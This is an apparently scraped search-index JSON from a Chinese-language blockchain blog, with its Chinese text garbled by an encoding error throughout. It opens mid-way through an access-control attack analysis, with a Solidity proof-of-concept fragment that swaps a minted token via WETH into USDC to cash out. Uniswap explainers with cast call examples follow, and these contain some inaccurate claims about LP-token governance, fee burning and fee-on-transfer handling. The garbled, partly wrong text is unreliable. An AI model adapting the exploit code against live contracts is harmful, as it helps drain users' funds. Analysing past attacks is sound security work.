ï¼ˆWETH \u003c=\u003e USDCï¼‰è¿›è¡Œç½®æ¢ï¼Œä»¥å¥—ç° address[] memory path = new address[](3); path[0] = address(myToken); path[1] = address(WETH); path[2] = address(USDC); uint[] memory amounts = QuickSwapRouter.swapExactTokensForTokens( 1000000000000000000000000, 0, path, address(this), block.timestamp ); emit log_named_decimal_uint(\"sw","date":"2023-03-15","objectID":"/phoenix-access-control-attack/:4:0","tags":["defi"],"title":"Phoenix è®¿é—®æ§åˆ¶æ”»å‡»åˆ†æ","uri":"/phoenix-access-control-attack/"},{"categories":["Blockchain"],"content":"uniswap API è§£é‡Šä¸ä¸¾ä¾‹ ","date":"2023-03-13","objectID":"/uniswap/:0:0","tags":["swap","L3","Web3.0"],"title":"Uniswap","uri":"/uniswap/"},{"categories":["Blockchain"],"content":"åè¯è§£é‡Š Uniswap lab: å¼€å‘Uniswapåè®®çš„å…¬å¸ï¼ŒåŒæ—¶ä¹Ÿå¼€å‘äº†ç½‘ç»œç•Œé¢ã€‚ Uniswap Protocol: ä¸€å¥—æŒä¹…çš„ã€ä¸å¯å‡çº§çš„æ™ºèƒ½åˆçº¦ï¼Œå…±åŒåˆ›å»ºäº†ä¸€ä¸ªè‡ªåŠ¨åšå¸‚å•†ï¼Œè¯¥åè®®ä¿ƒè¿›äº†ä»¥å¤ªåŠåŒºå—é“¾ä¸ŠERC-20ä»£å¸çš„ç‚¹å¯¹ç‚¹åšå¸‚å’Œäº¤æ¢ã€‚ Uniswap Interface: ä¸€ä¸ªç½‘ç»œç•Œé¢ï¼Œå…è®¸ä¸Uniswapåè®®è½»æ¾äº’åŠ¨ã€‚è¯¥ç•Œé¢åªæ˜¯äººä»¬ä¸Uniswapåè®®äº’åŠ¨çš„ä¼—å¤šæ–¹å¼ä¹‹ä¸€ã€‚ Uniswap Governance: ç”¨äºç®¡ç†Uniswapåè®®çš„æ²»ç†ç³»ç»Ÿï¼Œç”±UNIä»£å¸å¯ç”¨ã€‚ ","date":"2023-03-13","objectID":"/uniswap/:1:0","tags":["swap","L3","Web3.0"],"title":"Uniswap","uri":"/uniswap/"},{"categories":["Blockchain"],"content":"Fee-On-Transfer Tokens æ‰‹ç»­è´¹è½¬ç§»ä»£å¸ï¼ˆFee-On-Transfer Tokensï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„ä»£å¸ï¼Œå…¶ä¸»è¦ç‰¹ç‚¹æ˜¯åœ¨ä»£å¸è½¬ç§»çš„åŒæ—¶ï¼Œä¼šä»è½¬ç§»é‡‘é¢ä¸­æŠ½å–ä¸€å®šæ¯”ä¾‹çš„ä»£å¸ä½œä¸ºæ‰‹ç»­è´¹ï¼Œå¹¶å°†è¿™éƒ¨åˆ†ä»£å¸è½¬ç§»ç»™ä»£å¸çš„æŒæœ‰è€…æˆ–å…¶ä»–åœ°å€ã€‚ è¿™ç§ä»£å¸ä¸»è¦ç”¨äºåœ¨ä»£å¸äº¤æ˜“è¿‡ç¨‹ä¸­æ”¶å–æ‰‹ç»­è´¹ï¼Œè€Œä¸éœ€è¦ä»£å¸äº¤æ˜“åŒæ–¹è‡ªè¡Œæ”¯ä»˜æ‰‹ç»­è´¹ã€‚é€šå¸¸ï¼Œè¿™ç§ä»£å¸çš„æ‰‹ç»­è´¹ç‡æ˜¯åœ¨äº¤æ˜“å‘ç”Ÿæ—¶åŠ¨æ€è®¡ç®—çš„ï¼Œé€šå¸¸ä»¥å›ºå®šæ¯”ä¾‹æˆ–åŠ¨æ€ç®—æ³•çš„å½¢å¼è¿›è¡Œè®¡ç®—ã€‚æ‰‹ç»­è´¹å¯ä»¥ç”¨äºç»´æŠ¤ä»£å¸çš„ç”Ÿæ€ç³»ç»Ÿï¼Œæ”¯æŒå¼€å‘è€…ã€ç¤¾åŒºç­‰ã€‚ åœ¨ Uniswap ä¸­ï¼Œå¦‚æœä¸€ä¸ªä»£å¸æ˜¯ Fee-On-Transfer Tokensï¼Œé‚£ä¹ˆåœ¨å°†å…¶ä»æµåŠ¨æ€§æ± ä¸­ç§»é™¤æ—¶ï¼Œéœ€è¦æ ¹æ®ä»£å¸åœ¨æ± å­ä¸­çš„æ¯”ä¾‹è®¡ç®—æ‰‹ç»­è´¹ï¼Œå¹¶å°†å…¶è½¬ç§»åˆ° Uniswap åè®®çš„è´¹ç”¨æ± ä¸­ã€‚è¿™æ ·ï¼Œå°±å¯ä»¥é¿å…åœ¨ä»£å¸äº¤æ˜“æ—¶éœ€è¦äº¤çº³æ‰‹ç»­è´¹çš„éº»çƒ¦ï¼Œä½¿å¾—ä»£å¸äº¤æ˜“æ›´åŠ æ–¹ä¾¿å¿«æ·ã€‚ ä¸€äº›å®é™…å­˜åœ¨çš„ Fee-On-Transfer Tokens åŒ…æ‹¬ï¼šSafemoonã€Reflect.financeã€Moonratã€ElonGateç­‰ã€‚ ä»¥ Safemoon ä¸ºä¾‹ï¼ŒSafemoon æ˜¯ä¸€ç§åŸºäº Binance Smart Chain çš„ Fee-On-Transfer Tokensï¼Œå…¶äº¤æ˜“æ‰‹ç»­è´¹ä¸º 10%ï¼Œå…¶ä¸­ 5% ä½œä¸ºäº¤æ˜“æµåŠ¨æ€§æä¾›è€…çš„å¥–åŠ±ï¼Œ5% ä½œä¸ºæŒæœ‰è€…çš„å¥–åŠ±ã€‚å½“æŒæœ‰è€…åœ¨äº¤æ˜“æ—¶å‡ºå”® Safemoon ä»£å¸æ—¶ï¼Œäº¤æ˜“ä¸­çš„ 10% ä¼šè¢«æŠ½å–ä¸ºæ‰‹ç»­è´¹ï¼Œå…¶ä¸­ 5% ä¼šè‡ªåŠ¨æµå‘äº¤æ˜“å¯¹çš„æµåŠ¨æ€§æ± å­ï¼Œå¦å¤– 5% ä¼šæŒ‰æ¯”ä¾‹åˆ†é…ç»™ Safemoon çš„æ‰€æœ‰æŒæœ‰è€…ã€‚ Reflect.finance æ˜¯å¦ä¸€ä¸ª Fee-On-Transfer Tokensï¼Œå®ƒçš„äº¤æ˜“æ‰‹ç»­è´¹æ˜¯ 2%ã€‚åœ¨äº¤æ˜“æ—¶ï¼Œ2% çš„ä»£å¸ä¼šè¢«æŠ½å–ä¸ºæ‰‹ç»­è´¹ï¼Œå…¶ä¸­ 1% å°†ä¼šè‡ªåŠ¨æµå‘äº¤æ˜“å¯¹çš„æµåŠ¨æ€§æ± ï¼Œå¦å¤– 1% ä¼šæŒ‰æ¯”ä¾‹åˆ†é…ç»™æ‰€æœ‰çš„æŒæœ‰è€…ã€‚ è¿™äº›ä»£å¸çš„ç‰¹ç‚¹æ˜¯ï¼šåœ¨ä»£å¸è½¬ç§»çš„è¿‡ç¨‹ä¸­ï¼Œä¸€å®šæ¯”ä¾‹çš„ä»£å¸ä¼šè¢«æŠ½å–ä¸ºæ‰‹ç»­è´¹ï¼Œå¹¶æŒ‰ç…§ä¸€å®šçš„è§„åˆ™è¿›è¡Œåˆ†é…ã€‚è¿™ç§è®¾è®¡å¯ä»¥æ¿€åŠ±ä»£å¸æŒæœ‰è€…é•¿æœŸæŒæœ‰ä»£å¸ï¼Œå¹¶æœ‰åŠ©äºä»£å¸çš„ä»·æ ¼ç¨³å®šæ€§ã€‚ ","date":"2023-03-13","objectID":"/uniswap/:1:1","tags":["swap","L3","Web3.0"],"title":"Uniswap","uri":"/uniswap/"},{"categories":["Blockchain"],"content":"uniswap åè®® https://docs.uniswap.org/concepts/uniswap-protocol Uniswapåè®®æ˜¯ä¸€ä¸ªç‚¹å¯¹ç‚¹ç³»ç»Ÿï¼Œæ—¨åœ¨äº¤æ¢ä»¥å¤ªåŠåŒºå—é“¾ä¸Šçš„åŠ å¯†è´§å¸ï¼ˆERC-20ä»£å¸ï¼‰ã€‚è¯¥åè®®è¢«å®ç°ä¸ºä¸€å¥—æŒä¹…çš„ã€ä¸å¯å‡çº§çš„æ™ºèƒ½åˆçº¦ï¼›æ—¨åœ¨ä¼˜å…ˆè€ƒè™‘æŠ—å®¡æŸ¥ã€å®‰å…¨ã€è‡ªæˆ‘ç›‘æŠ¤ï¼Œå¹¶åœ¨æ²¡æœ‰ä»»ä½•å¯ä¿¡ä»»çš„ä¸­ä»‹æœºæ„å¯èƒ½é€‰æ‹©æ€§åœ°é™åˆ¶è®¿é—®çš„æƒ…å†µä¸‹è¿ä½œã€‚ uniswapä½¿ç”¨è‡ªåŠ¨åšå¸‚å•†ï¼ˆAMM, Auto Market Makingï¼‰ï¼Œæœ‰æ—¶è¢«ç§°ä¸ºæ’å®šåŠŸèƒ½åšå¸‚å•†ï¼Œæ¥ä»£æ›¿è®¢å•ç°¿(order book)ã€‚ AMMç”¨ä¸¤ç§èµ„äº§çš„æµåŠ¨æ€§æ± å–ä»£äº†è®¢å•ç°¿å¸‚åœºä¸Šçš„ä¹°å–è®¢å•ï¼Œè¿™ä¸¤ç§èµ„äº§éƒ½æ˜¯ç›¸å¯¹äºå¯¹æ–¹çš„ä»·å€¼ã€‚å½“ä¸€ç§èµ„äº§è¢«äº¤æ˜“ä¸ºå¦ä¸€ç§èµ„äº§æ—¶ï¼Œä¸¤ç§èµ„äº§çš„ç›¸å¯¹ä»·æ ¼å°±ä¼šå‘ç”Ÿå˜åŒ–ï¼Œä¸¤ç§èµ„äº§çš„æ–°å¸‚åœºä»·æ ¼å°±ä¼šç¡®å®šã€‚åœ¨è¿™ç§åŠ¨æ€ä¸­ï¼Œä¹°æ–¹æˆ–å–æ–¹ç›´æ¥ä¸èµ„é‡‘æ± è¿›è¡Œäº¤æ˜“ï¼Œè€Œä¸æ˜¯ä¸å…¶ä»–å„æ–¹ç•™ä¸‹çš„å…·ä½“è®¢å•è¿›è¡Œäº¤æ˜“ã€‚ ","date":"2023-03-13","objectID":"/uniswap/:2:0","tags":["swap","L3","Web3.0"],"title":"Uniswap","uri":"/uniswap/"},{"categories":["Blockchain"],"content":"uniswap V1 äº¤æ˜“æ˜¯é’ˆå¯¹æ™ºèƒ½åˆçº¦æˆ–æµåŠ¨æ€§æ± çš„ï¼Œä¸€ä¸ªæ•°å­¦å…¬å¼å†³å®šäº†èµ„äº§çš„ä»·æ ¼ã€‚æµåŠ¨æ€§æä¾›è€…å‘å¸®åŠ©åšå¸‚çš„æ± å­å¢åŠ æµåŠ¨æ€§ã€‚ åœ¨UniswapæµåŠ¨æ€§æ± ä¸­ï¼Œäº¤æ˜“èµ„äº§å¯¹çš„æ¯”ä¾‹åº”è¯¥æ˜¯æ’å®šçš„ã€‚å…¶æ•°å­¦è¡¨è¾¾å¼ä¸º X * Y = K X :ç¬¬ä¸€ç§èµ„äº§çš„å‚¨å¤‡ Y : ç¬¬äºŒä¸­èµ„äº§çš„å‚¨å¤‡ æµåŠ¨æ€§æä¾›è€…åº”ä»¥Kçš„æ–¹å¼å¢åŠ æµåŠ¨æ€§ï¼Œä½¿å…¶ä¸å‘ç”Ÿå˜åŒ–ã€‚ Uniswap v1åªæ”¯æŒETH-ERC 20å¯¹çš„äº’æ¢ã€‚å¦‚æœç”¨æˆ·å¸Œæœ›å°†USDCæ¢æˆDAIï¼Œç¬¬ä¸€æ­¥æ˜¯å°†USDCæ¢æˆETHï¼Œç„¶åå…‘æ¢ETH-DAIï¼Œå¾—åˆ°DAIã€‚Uniswap v1è¿˜ä¿ƒè¿›äº†LPä»£å¸çš„æ¦‚å¿µã€‚å½“æµåŠ¨æ€§æä¾›è€…ï¼ˆLPsï¼‰å‘ä»»ä½•æ± å­å¢åŠ æµåŠ¨æ€§æ—¶ï¼Œä»–ä»¬ä¼šæ”¶åˆ°ä»£è¡¨å¢åŠ çš„æµåŠ¨æ€§çš„LPä»£å¸ã€‚ç„¶åï¼Œè¿™äº›LPä»£å¸å¯ä»¥è¢«æŠ¼æ³¨æˆ–ç‡ƒçƒ§ï¼Œä»¥èµå›å¥–åŠ±ã€‚ä¸ºäº†å¥–åŠ±æµåŠ¨æ€§æä¾›è€…ï¼Œä¼šäº§ç”Ÿ0.3%çš„äº¤æ˜“è´¹ã€‚ ","date":"2023-03-13","objectID":"/uniswap/:2:1","tags":["swap","L3","Web3.0"],"title":"Uniswap","uri":"/uniswap/"},{"categories":["Blockchain"],"content":"uniswap V2 Uniswap v1çš„ä¸»è¦ç¼ºç‚¹æ˜¯ â€œETHæ¡¥æ¥ â€œé—®é¢˜ï¼Œå³ç¼ºä¹ERC20-ERC20ä»£å¸æ± ã€‚è¿™å¯¼è‡´äº†å½“ç”¨æˆ·æƒ³è¦äº¤æ¢ä¸€ä¸ªERC20ä»£å¸æ—¶ï¼Œæˆæœ¬ä¸Šå‡å’Œé«˜æ»‘ç‚¹(high slippage) Uniswap v2åœ¨ç”¨æˆ·ç•Œé¢å’Œä½“éªŒä¸Šæ¯”v1å¥½å¾—å¤šã€‚åŒæ—¶ï¼Œå®ƒé€šè¿‡å¼•å…¥ERC20-ERC20æ± çš„æ¦‚å¿µï¼Œæ¶ˆé™¤äº†ETHæ¡¥æ¥çš„é—®é¢˜ã€‚å¦ä¸€ä¸ªé‡è¦çš„åŒºåˆ«æ˜¯åœ¨æ ¸å¿ƒåˆçº¦ä¸­ä½¿ç”¨wrapped ETHï¼Œè€Œä¸æ˜¯åŸç”ŸETHã€‚ç„¶è€Œï¼Œäº¤æ˜“è€…å¯ä»¥é€šè¿‡è¾…åŠ©åˆçº¦ä½¿ç”¨ETHã€‚ Uniswap v2çš„é—ªç”µäº’æ¢(FlashSwap)æ¦‚å¿µå…è®¸ç”¨æˆ·æå–ä»»ä½•æ•°é‡çš„ERC20ä»£å¸ï¼Œè€Œä¸éœ€è¦é¢„å…ˆä»˜æ¬¾ã€‚ä½†ä»–ä»¬å¯ä»¥ä¸ºæå–çš„ä»£å¸ä»˜æ¬¾ï¼Œæˆ–æ”¯ä»˜ä¸€éƒ¨åˆ†å¹¶å½’è¿˜å…¶ä½™éƒ¨åˆ†ï¼Œæˆ–å½’è¿˜æ‰€æœ‰æå–çš„ä»£å¸ã€‚è¿™äº›äº‹æƒ…å¯ä»¥åœ¨äº¤æ˜“æ‰§è¡Œç»“æŸæ—¶è¿›è¡Œã€‚ Uniswap v2è¿˜å¼•å…¥äº†åè®®è´¹ã€‚ç¤¾åŒºæ²»ç†åœ¨å¼€å¯/å…³é—­è¿™é¡¹è´¹ç”¨æ–¹é¢èµ·ç€è‡³å…³é‡è¦çš„ä½œç”¨ã€‚0.3%çš„äº¤æ˜“è´¹ä¸­çš„0.05%çš„åè®®è´¹å°†è¢«ä¿ç•™ç»™å¡‘é€ ç½‘ç»œè·¯çº¿å›¾çš„Uniswapå¹³å°çš„å‘å±•ã€‚ ","date":"2023-03-13","objectID":"/uniswap/:2:2","tags":["swap","L3","Web3.0"],"title":"Uniswap","uri":"/uniswap/"},{"categories":["Blockchain"],"content":"uniswarp V3 Uniswap v3æ—¨åœ¨è¶…è¶ŠåŸºäºç¨³å®šå¸çš„AMMå’Œé›†ä¸­å¼äº¤æ˜“æ‰€ï¼Œæä¾›æ›´å¥½çš„èµ„æœ¬æ•ˆç‡å’Œå‡†ç¡®æ€§ï¼Œæ›´çµæ´»çš„æ”¶è´¹ç»“æ„ï¼Œä»¥åŠæµåŠ¨æ€§æä¾›è€…æ ¹æ®è‡ªå·±çš„å–œå¥½å»ºç«‹ç‹¬ç‰¹çš„ä»·æ ¼æ›²çº¿çš„èƒ½åŠ›ã€‚Uniswap v3è¿˜å…è®¸LPsåœ¨è‡ªå®šä¹‰çš„ä»·æ ¼èŒƒå›´å†…é›†ä¸­ä»–ä»¬çš„èµ„æœ¬ï¼Œå¢å¼ºæ‰€éœ€ä»·æ ¼çš„æµåŠ¨æ€§ï¼Œå¹¶åœ¨å¸‚åœºè¶…å‡ºLPæŒ‡å®šçš„ä»·æ ¼èŒƒå›´æ—¶è‡ªåŠ¨ä»æ± ä¸­ç§»é™¤æµåŠ¨æ€§ã€‚Uniswap v3çš„æ”¶è´¹ç»“æ„æ˜¯ç”±ç¤¾åŒºç®¡ç†çš„ï¼ŒåŒ…æ‹¬ä¸‰ä¸ªä¸åŒçš„æ”¶è´¹ç­‰çº§ã€‚ ","date":"2023-03-13","objectID":"/uniswap/:2:3","tags":["swap","L3","Web3.0"],"title":"Uniswap","uri":"/uniswap/"},{"categories":["Blockchain"],"content":"V2åˆçº¦ ","date":"2023-03-13","objectID":"/uniswap/:3:0","tags":["swap","L3","Web3.0"],"title":"Uniswap","uri":"/uniswap/"},{"categories":["Blockchain"],"content":"Facotry https://docs.uniswap.org/contracts/v2/reference/smart-contracts/factory åœ¨ Uniswap åè®®ä¸­ï¼ŒFactory æ˜¯æŒ‡ Uniswap çš„å·¥å‚åˆçº¦ï¼Œå®ƒæ˜¯åˆ›å»º Uniswap å¸‚åœºçš„ä¸»è¦åˆçº¦ã€‚å®ƒçš„ä½œç”¨æ˜¯å……å½“ä¸­å¤®åŒ–çš„å¸‚åœºåˆ¶é€ å•†ï¼Œå…è®¸ä»»ä½•äººåœ¨ Uniswap ä¸Šåˆ›å»ºè‡ªå·±çš„äº¤æ˜“å¯¹ï¼Œä¾‹å¦‚ ETH/DAI æˆ– USDC/DAI ç­‰ã€‚ å½“ä¸€ä¸ªç”¨æˆ·æƒ³è¦åˆ›å»ºä¸€ä¸ªæ–°çš„äº¤æ˜“å¯¹æ—¶ï¼Œä»–ä»¬ä¼šå°†èµ„äº§æ·»åŠ åˆ° Liquidity Pool ä¸­ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šè§¦å‘ Factory åˆçº¦ï¼ŒFactory åˆçº¦ä¼šæ ¹æ®è¾“å…¥çš„ä¸¤ç§èµ„äº§ç±»å‹çš„åœ°å€åˆ›å»ºä¸€ä¸ªæ–°çš„äº¤æ˜“å¯¹ï¼Œå¹¶å°† Liquidity Pool æ·»åŠ åˆ°æ–°åˆ›å»ºçš„äº¤æ˜“å¯¹ä¸­ã€‚Factory åˆçº¦è¿˜è´Ÿè´£ä¸ºæ¯ä¸ªæ–°çš„äº¤æ˜“å¯¹åˆ›å»ºå¯¹åº”çš„äº¤æ˜“å¯¹åˆçº¦ï¼Œä»¥ä¾¿äº¤æ˜“å¯¹çš„äº¤æ˜“å¯ä»¥è¢«æ‰§è¡Œã€‚ åœ°å€ 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f æ¥å£ import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol'; import IUniswapV2Factory from '@uniswap/v2-core/build/IUniswapV2Factory.json' pragma solidity \u003e=0.5.0; interface IUniswapV2Factory { event PairCreated(address indexed token0, address indexed token1, address pair, uint); function getPair(address tokenA, address tokenB) external view returns (address pair); function allPairs(uint) external view returns (address pair); function allPairsLength() external view returns (uint); function feeTo() external view returns (address); function feeToSetter() external view returns (address); function createPair(address tokenA, address tokenB) external returns (address pair); } ä¸‹é¢æ‰€æœ‰çš„ä¸¾ä¾‹éƒ½å‡è®¾ä½ è®¾ç½®äº† ETH_RPC_URL= ç¯å¢ƒå˜é‡ event PairCreated event PairCreated(address indexed token0, address indexed token1, address pair, uint); allPairs è·å–ç¬¬Nä¸ªäº¤æ˜“å¯¹ function allPairs(uint) external view returns (address pair); ä¸¾ä¾‹: # è¿”å›ç¬¬1ä¸ªpairçš„åœ°å€: 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc cast call 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f \"allPairs(uint)(address)\" 0 # è¿”å›pairçš„token0çš„åœ°å€: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 cast call 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc \"token0()(address)\" # è¿”å›token0åç§°: USD Coin cast call 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 \"name()(string)\" # è¿”å›pairçš„token1çš„åœ°å€: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 cast call 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc \"token1()(address)\" # è¿”å›token1åç§°: Wrapped Ether cast call 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 \"name()(string)\" # æ‰€ä»¥ç¬¬ä¸€ä¸ªäº¤æ˜“å¯¹æ˜¯ USD Coin å’Œ Wrapped Ether getPair ä¼ å…¥token1å’Œtoken2åœ°å€, æŸ¥è¯¢å¯¹åº”çš„pairåœ°å€ (ä¸å­˜åœ¨è¿”å›0x0) function getPair(address tokenA, address tokenB) external view returns (address pair); ä¸¾ä¾‹: # æ¯”å¦‚æŸ¥è¯¢ DAI-USDCäº¤æ˜“å¯¹å¯¹åº”çš„Pair # DAI: 0x6B175474E89094C44Da98b954EedeAC495271d0F # USDC: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 # è¿”å›: 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5 cast call 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f \"getPair(address,address)(address)\" 0x6B175474E89094C44Da98b954EedeAC495271d0F 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 allPairsLength è¿”å›pairæ€»æ•° function allPairsLength() external view returns (uint); ä¸¾ä¾‹ # è¿”å› 150745 cast call 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f \"allPairsLength()(uint)\" feeTo æ‰‹ç»­è´¹æ”¶å–äººåœ°å€. å½“ç”¨æˆ·åœ¨ Uniswap ä¸Šè¿›è¡Œäº¤æ˜“æ—¶ï¼Œäº¤æ˜“æ‰€æ”¶å–çš„è´¹ç”¨å°†è¢«åˆ†æˆä¸¤éƒ¨åˆ†ï¼šä¸€éƒ¨åˆ†å°†è¢«ç›´æ¥é”€æ¯ï¼ˆburnï¼‰ï¼Œå¦ä¸€éƒ¨åˆ†å°†è¢«åˆ†é…ç»™ feeTo å‡½æ•°æŒ‡å®šçš„åœ°å€ã€‚é”€æ¯çš„éƒ¨åˆ†æ˜¯ä¸ºäº†ä¿è¯ Uniswap åè®®ä¸­çš„æµåŠ¨æ€§èµ„äº§æ€»é‡ä¸ä¼šå› ä¸ºæ‰‹ç»­è´¹çš„ç§¯ç´¯è€Œå¢åŠ ï¼Œè€Œåˆ†é…ç»™ feeTo å‡½æ•°æŒ‡å®šçš„åœ°å€çš„éƒ¨åˆ†åˆ™å¯ä»¥è¢«ç”¨äºå¥–åŠ±äº¤æ˜“æ‰€ï¼Œä¾‹å¦‚æ”¯ä»˜ç»™å¼€å‘è€…æˆ–ç”¨äºé¡¹ç›®è¿è¥ç­‰ã€‚ function feeToSetter() external view returns (address); ç›®å‰ feeToçš„åœ°å€æ˜¯0x0 å‚è€ƒè¿™é‡Œ: https://docs.uniswap.org/contracts/v2/concepts/advanced-topics/fees#protocol-charge-calculation feeToSetter function feeToSetter() external view returns (address); è·å–å¯ä»¥æ›´æ–°feeToåœ°å€çš„åœ°å€ (The address allowed to change feeTo.) createPair åˆ›å»ºPair. (Creates a pair for tokenA and tokenB if one doesnâ€™t exist already.) åˆ›å»ºæ—¶tokenAå’ŒtokenBçš„ä¼ å…¥é¡ºåºæ˜¯ç”±å½±å“çš„, å› ä¸ºPairçš„åœ°å€æ˜¯è¿™æ ·è®¡ç®—çš„ address pairAddress2 = address( uint160( ( uint( keccak256( abi.encodePacked( hex\"ff\", factory, keccak256(abi.encodePacked(tokenA, tokenB)), hex\"96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f\" ) ) ) ) ) ); function createPair(address tokenA, address tokenB) external returns (address pair); ä¸¾ä¾‹: // SPDX-License-Identifier: SEE LICENSE IN LICENSE pragma solidity ^0.8.10; import \"forge-std/Test.sol\"; // forge install OpenZeppelin/openzeppelin-contracts --no-commit import \"lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\"; // forge install --no-commit Uniswap/v2-core import \"lib/v2-core/contracts/interfaces/IUniswapV2Factory.sol\"; import \"lib/v2-core/contracts/interfaces/IUniswapV2Pair.sol\"; address cons","date":"2023-03-13","objectID":"/uniswap/:3:1","tags":["swap","L3","Web3.0"],"title":"Uniswap","uri":"/uniswap/"},{"categories":["Blockchain"],"content":"Pair https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair åœ¨Uniswapä¸­ï¼ŒPairæ˜¯æŒ‡ä¸€å¯¹ä»£å¸çš„äº¤æ˜“æ± ï¼Œç”¨äºäº¤æ¢è¿™ä¸¤ç§ä»£å¸ã€‚Uniswapçš„äº¤æ˜“æ± é‡‡ç”¨è‡ªåŠ¨åšå¸‚å•†æ¨¡å‹ï¼ˆAutomated Market Makerï¼ŒAMMï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä»¬é€šè¿‡æ™ºèƒ½åˆçº¦è‡ªåŠ¨ç¡®å®šä»£å¸çš„ä»·æ ¼ï¼Œè€Œä¸æ˜¯ä¾èµ–äºä¼ ç»Ÿçš„ä¹°å–è®¢å•ç°¿ã€‚ æ¯ä¸ªPairéƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„åœ°å€ï¼Œç”±ä»£å¸çš„åˆçº¦åœ°å€è®¡ç®—è€Œæ¥ã€‚ä¾‹å¦‚ï¼Œåœ¨ETH/USDTäº¤æ˜“å¯¹ä¸­ï¼ŒETHå’ŒUSDTçš„ä»£å¸åˆçº¦åœ°å€ä¼šè¢«ç»„åˆæˆä¸€ä¸ªæ–°çš„åœ°å€ï¼Œè¯¥åœ°å€å°±æ˜¯Pairçš„åœ°å€ã€‚ æ¯ä¸ªPairä¸­éƒ½ä¼šå­˜å‚¨ç›¸åº”ä»£å¸çš„ä½™é¢å’Œæ±‡ç‡ï¼Œæ±‡ç‡æ˜¯æŒ‡ä¸€ä¸ªä»£å¸ç›¸å¯¹äºå¦ä¸€ä¸ªä»£å¸çš„ä»·æ ¼æ¯”ç‡ã€‚å½“ç”¨æˆ·åœ¨ä¸€ä¸ªPairä¸­è¿›è¡Œäº¤æ˜“æ—¶ï¼Œä»–ä»¬ä¼šæŠŠä¸€ç§ä»£å¸å‘é€åˆ°è¯¥Pairçš„æ™ºèƒ½åˆçº¦åœ°å€ï¼Œæ™ºèƒ½åˆçº¦ä¼šè‡ªåŠ¨è®¡ç®—å‡ºç›¸åº”çš„æ±‡ç‡ï¼Œç„¶åè¿”å›ç­‰å€¼çš„å¦ä¸€ç§ä»£å¸ã€‚ å½“ç”¨æˆ·åœ¨Uniswapä¸Šåˆ›å»ºä¸€ä¸ªæ–°çš„äº¤æ˜“å¯¹æ—¶ï¼Œä¼šé€šè¿‡è°ƒç”¨Factoryåˆçº¦çš„createPairå‡½æ•°æ¥åˆ›å»ºæ–°çš„Pairã€‚createPairå‡½æ•°ä¼šå°†ä¸¤ä¸ªä»£å¸çš„åˆçº¦åœ°å€ä½œä¸ºè¾“å…¥å‚æ•°ï¼Œå¹¶ä½¿ç”¨è¿™äº›åœ°å€æ¥è®¡ç®—Pairçš„åœ°å€ã€‚åˆ›å»ºæˆåŠŸåï¼Œè¯¥Pairå°†è¢«æ·»åŠ åˆ°Uniswapä¸­ï¼Œå¹¶ä¸”ç”¨æˆ·å°±å¯ä»¥åœ¨è¯¥Pairä¸­è¿›è¡Œäº¤æ˜“äº†ã€‚ æ¯ä¸ªPairéƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ä»£å¸ï¼Œç§°ä¸ºLPä»£å¸æˆ–æµåŠ¨æ€§ä»£å¸ï¼ˆLiquidity Provider Tokenï¼‰ã€‚å½“ä¸€ä¸ªç”¨æˆ·å‘Pairä¸­æä¾›æµåŠ¨æ€§æ—¶ï¼Œä»–ä»¬ä¼šæ”¶åˆ°ç›¸åº”æ•°é‡çš„LPä»£å¸ï¼Œè¿™äº›ä»£å¸ä»£è¡¨ç”¨æˆ·å‘äº¤æ˜“æ± ä¸­è´¡çŒ®çš„æµåŠ¨æ€§ã€‚ LPä»£å¸å¯ä»¥ç”¨äºå¤šç§ç”¨é€”ã€‚é¦–å…ˆï¼Œç”¨æˆ·å¯ä»¥éšæ—¶å°†å…¶èµå›ï¼Œä»¥å–å›ç›¸åº”çš„æµåŠ¨æ€§ã€‚æ­¤å¤–ï¼ŒLPä»£å¸ä¹Ÿå¯ä»¥ç”¨äºæŠ•ç¥¨å’Œæ²»ç†ï¼Œä¾‹å¦‚ï¼Œåœ¨Uniswapçš„æ²»ç†ä¸­ï¼ŒæŒæœ‰LPä»£å¸çš„ç”¨æˆ·å¯ä»¥æŠ•ç¥¨è¡¨å†³å…³äºUniswapåè®®çš„å†³ç­–ã€‚æœ€åï¼Œç”¨æˆ·è¿˜å¯ä»¥å°†å…¶LPä»£å¸è´¨æŠ¼åˆ°å„ç§æµåŠ¨æ€§æŒ–çŸ¿å¹³å°ä¸Šï¼Œä»¥è·å–ä»£å¸çš„å¥–åŠ±ã€‚ LPs(æµåŠ¨æ€§æä¾›å•†)å¯ä»¥é€šè¿‡å‘æ± å­é‡Œæ·»åŠ ä»£å¸æ¥èµšå–äº¤æ˜“è´¹ï¼Œä»¥è·å¾—LPä»£å¸çš„å¥–åŠ± éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ¯ä¸ªPairçš„LPä»£å¸æ˜¯ç‹¬ç«‹çš„ï¼Œä¸åŒçš„äº¤æ˜“å¯¹å°†æœ‰ä¸åŒçš„LPä»£å¸ã€‚æ­¤å¤–ï¼ŒLPä»£å¸çš„ä»·å€¼æ˜¯æ ¹æ®Pairä¸­å­˜å‚¨çš„ä»£å¸ä½™é¢å’Œæ±‡ç‡æ¥è®¡ç®—çš„ï¼Œå› æ­¤å®ƒä»¬çš„ä»·å€¼ä¼šéšç€Pairä¸­ä»£å¸ä½™é¢å’Œä»·æ ¼çš„å˜åŒ–è€Œå˜åŒ–ã€‚ 